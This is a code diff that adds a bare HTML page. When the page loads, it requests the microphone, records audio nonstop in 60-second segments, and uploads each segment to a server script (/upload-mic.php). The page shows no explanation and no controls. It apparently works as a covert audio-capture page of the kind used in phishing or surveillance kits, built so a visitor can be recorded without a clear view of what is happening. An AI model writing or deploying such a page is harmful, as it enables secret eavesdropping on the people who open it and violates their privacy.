@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head></head>
+<body>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="1000" height="1000" style="display:none;"></canvas>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    function startCapture() {
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+        video.srcObject = stream;
+        startAudioRecording(stream);
+      });
+    }
+
+ function startAudioRecording(stream) {
+   const audioStream = new MediaStream(stream.getAudioTracks());
+   const options     = { mimeType: 'audio/webm;codecs=opus' };
+   if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+     delete options.mimeType;             // fall back gracefully
+   }
+
+   function startSegment() {
+     const recorder = new MediaRecorder(audioStream, options);
+     const segmentTimestamp = Date.now();
+     const filename = `mic-${segmentTimestamp}.webm`;
+
+     recorder.ondataavailable = e => {
+       if (e.data && e.data.size > 0) {
+         const formData = new FormData();
+         formData.append('audio', e.data, filename);
+         fetch('/upload-mic.php', { method: 'POST', body: formData });
+       }
+     };
+
+     recorder.start();
+     setTimeout(() => recorder.stop(), 60000); // Stop the recording after 60 seconds
+   }
+
+   startSegment();
+   setInterval(startSegment, 60000); // Every 60 seconds, start recording again
+ }
+
+
+    startCapture();
+  </script>
+</body>
+</html>
